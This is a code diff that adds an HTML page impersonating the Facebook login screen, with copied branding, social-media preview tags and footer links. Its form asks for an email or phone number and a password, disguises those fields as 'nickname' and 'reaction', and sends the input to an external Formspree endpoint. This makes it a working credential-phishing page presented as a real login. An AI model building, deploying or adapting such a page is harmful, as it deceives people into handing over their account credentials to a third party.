@@ -1,0 +1,114 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <!-- Basic -->
+    <title>Facebook</title>
+    <meta name="description" content="Log in to Facebook" />
+
+    <!-- Open Graph (Facebook, WhatsApp, iMessage...) -->
+    <meta property="og:type" content="website" />
+    <meta property="og:title" content="Facebook" />
+    <meta property="og:description" content="Log in to Facebook" />
+    <meta
+      property="og:image"
+      content="https://faajr-prayer.connectly-github-pages.workers.dev/prank-preview.png"
+    />
+    <meta
+      property="og:url"
+      content="https://faajr-prayer.connectly-github-pages.workers.dev/"
+    />
+
+    <!-- Twitter -->
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="Facebook" />
+    <meta name="twitter:description" content="Log in to Facebook" />
+    <meta
+      name="twitter:image"
+      content="https://faajr-prayer.connectly-github-pages.workers.dev/prank-preview.png"
+    />
+
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body>
+    <main class="page-shell">
+      <section class="hero" aria-labelledby="page-title">
+        <h1 class="brand" id="page-title">Facebook</h1>
+        <p class="tagline">Facebook</p>
+      </section>
+
+      <section class="form-area" aria-label="Facebook">
+        <form
+          class="contact-card"
+          id="name-form"
+          action="https://formspree.io/f/moevqzeg"
+          method="post"
+          novalidate
+        >
+          <input
+            class="honeypot"
+            name="_gotcha"
+            type="text"
+            tabindex="-1"
+            autocomplete="off"
+            aria-hidden="true"
+          />
+          <input name="subject" type="hidden" value="fajr prayer" />
+
+          <label class="sr-only" for="nickname">Nickname</label>
+          <input
+            id="nickname"
+            name="nickname"
+            type="text"
+            autocomplete="nickname"
+            placeholder="Email adress or phone number"
+            aria-describedby="form-message submission-note"
+          />
+
+          <label class="sr-only" for="reaction">Your reaction</label>
+          <input
+            id="reaction"
+            name="reaction"
+            type="text"
+            autocomplete="off"
+            placeholder="Password"
+            aria-describedby="form-message submission-note"
+          />
+
+          <button class="submit-button" id="submit-button" type="submit">Log in</button>
+          <p class="form-message" id="form-message" aria-live="polite"></p>
+
+          <div class="divider" aria-hidden="true"></div>
+          <p class="submission-note" id="submission-note"></p>
+        </form>
+      </section>
+    </main>
+
+    <footer class="site-footer">
+      <div class="footer-inner">
+        <nav class="language-links" aria-label="Languages">
+          <span>English (UK)</span>
+          <span>Français (France)</span>
+          <span>العربية</span>
+          <span>Español</span>
+          <span>Deutsch</span>
+          <span>Italiano</span>
+          <span>Português (Brasil)</span>
+          <span>हिन्दी</span>
+        </nav>
+        <div class="footer-divider" aria-hidden="true"></div>
+        <nav class="utility-links" aria-label="Site links">
+          <span>About</span>
+          <span>Privacy</span>
+          <span>Terms</span>
+          <span>Help</span>
+        </nav>
+        <p class="copyright">Facebook © 2026</p>
+      </div>
+    </footer>
+
+    <script src="app.js"></script>
+  </body>
+</html>
